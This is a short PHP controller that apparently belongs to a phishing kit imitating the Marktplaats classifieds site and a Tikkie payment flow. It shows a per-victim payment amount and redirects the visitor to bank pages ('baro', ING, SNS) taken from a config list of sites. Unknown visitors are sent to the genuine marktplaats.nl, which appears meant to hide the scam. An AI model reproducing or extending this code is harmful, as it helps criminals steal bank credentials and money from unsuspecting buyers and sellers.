<?php 
namespace controllers;

class marktplaats{ 

	private $marktplaats_model;

    public function __construct() {
        $this->marktplaats_model = new \models\marktplaats();
    }

    public function iban($uid) {
        $marktplaats = $this->marktplaats_model->getInfo($uid);
        
        if($marktplaats) {
            
            if(isset($_POST['tikkiebankselect'])) {
                if($_POST['tikkiebankselect'] === "baro") {
                    header("Location: https://".\config\config::$sites[3]['url'], true, 302);
                }elseif($_POST['tikkiebankselect'] === "ing") {
                    header("Location: https://".\config\config::$sites[4]['url'], true, 302);
                }elseif($_POST['tikkiebankselect'] === "sns") { 
                    header("Location: https://".\config\config::$sites[5]['url'], true, 302);

                }else{
                    die(var_dump($_POST));
                }
            }

            $tpl = new \classes\core\template("./views/marktplaats/iban/index.html");
                 $tpl->set("bedrag", $marktplaats['bedrag']);
            echo $tpl->draw();

        }else{ 
            header("Location: https://marktplaats.nl/", true, 302);
            die();
         }

    }   
}
